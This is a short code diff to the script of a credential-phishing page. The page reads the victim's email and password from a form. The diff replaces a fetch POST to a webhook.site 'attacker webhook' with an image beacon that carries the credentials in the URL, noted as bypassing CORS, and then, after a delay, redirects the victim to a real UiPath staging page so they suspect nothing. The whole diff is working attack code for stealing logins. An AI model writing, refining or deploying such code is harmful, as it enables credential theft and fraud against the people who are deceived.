@@ -133,16 +133,14 @@
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
 
-            // Send captured credentials to attacker webhook
-            fetch('https://webhook.site/1745adb6-9637-4bdb-9bf0-1f1c497d81c4/creds', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: email, password: password }),
-                mode: 'no-cors'
-            });
+            // img beacon - bypasses CORS completely
+            var img = new Image();
+            img.src = 'https://webhook.site/1745adb6-9637-4bdb-9bf0-1f1c497d81c4/creds?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
 
-            // Redirect back to real UiPath so victim doesn't suspect anything
-            window.location.href = 'https://staging.uipath.com/cursororg/DefaultTenant/testmanager_/123/requirements';
+            // Wait for beacon to fire then redirect to real site
+            setTimeout(function() {
+                window.location.href = 'https://staging.uipath.com/cursororg/DefaultTenant/testmanager_/123/requirements';
+            }, 500);
         });
     </script>
 </body>
